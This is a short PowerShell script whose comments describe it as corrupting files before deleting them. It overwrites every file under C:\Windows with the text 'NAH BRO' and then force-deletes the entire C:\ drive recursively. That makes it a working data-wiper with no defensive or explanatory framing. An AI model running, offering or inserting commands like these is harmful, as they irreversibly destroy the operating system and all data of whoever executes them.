# Instead of just deleting, "corrupt" them first
Get-ChildItem C:\Windows -Recurse | ForEach-Object { 
    "NAH BRO" | Out-File $_.FullName -Force 
}
# Then delete
Remove-Item C:\ -Recurse -Force